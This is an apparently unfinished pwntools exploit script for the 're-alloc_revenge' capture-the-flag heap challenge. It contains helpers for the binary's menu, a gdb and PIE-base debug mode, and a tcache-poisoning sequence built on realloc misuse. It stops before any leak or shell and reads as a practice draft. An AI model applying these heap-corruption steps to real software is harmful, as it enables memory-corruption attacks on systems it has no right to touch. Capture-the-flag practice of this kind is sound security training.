#!/usr/bin/env python3
from pwn import *

QWORD = 8
DUMMY = 0xdeadbeefcafebeef
OBJ0, OBJ1 = 0, 1

elf = ELF("./re-alloc_revenge_patched")
libc = ELF("./given/libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            mem_map = f.read()
            f.close()
        mem_map = mem_map.split(b"\n")
        pie_base = None
        for region in mem_map:
            if b"re-alloc_revenge_patched" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                log.info("PIE base found: {}".format(hex(pie_base)))
                break
        if pie_base is None:
            log.info("Cannot find PIE base")
            quit()
        log.info(f"Data heap[0]: {hex(pie_base + 0x4050)}")
        log.info(f"Data heap[1]: {hex(pie_base + 0x4058)}")
        gdb.attach(p, gdbscript="\n".join([
                "b *{} + 0x178b".format(hex(pie_base))
            ]))

def alloc_data(idx, size, data):
    p.sendlineafter(b"Your choice: ", b"1")
    p.sendlineafter(b"Index:", str(idx).encode())
    p.sendlineafter(b"Size:", str(size).encode())
    p.sendafter(b"Data:", data)

def realloc_data(idx, size, data):
    p.sendlineafter(b"Your choice: ", b"2")
    p.sendlineafter(b"Index:", str(idx).encode())
    p.sendlineafter(b"Size:", str(size).encode())
    p.sendafter(b"Data:", data)

def free_data(idx):
    p.sendlineafter(b"Your choice:", b"2")
    p.sendlineafter(b"Index:", str(idx).encode())
    p.sendlineafter(b"Size:", b"0")

def free_and_clear_data(idx):
    p.sendlineafter(b"Your choice: ", b"3")
    p.sendlineafter(b"Index:", str(idx).encode())

def tcache_poison():
    size = 0x18
    med_size = size + 0x10
    big_size = size + 0x30

    alloc_data(OBJ0, size, p64(DUMMY))
    alloc_data(OBJ1, size, p64(DUMMY))
    free_and_clear_data(OBJ0)
    free_data(OBJ1)
    realloc_data(OBJ1, size, p64(0xaaaaaaaa))

    alloc_data(OBJ0, size, p64(DUMMY))
    realloc_data(OBJ0, big_size, p64(DUMMY))
    free_and_clear_data(OBJ0)

    realloc_data(OBJ1, med_size, p64(DUMMY))
    free_and_clear_data(OBJ1)

def exploit():
    tcache_poison()

    # debug
    # exit
    p.sendlineafter(b"Your choice: ", b"4")
    p.interactive()

if __name__ == "__main__":
    exploit()
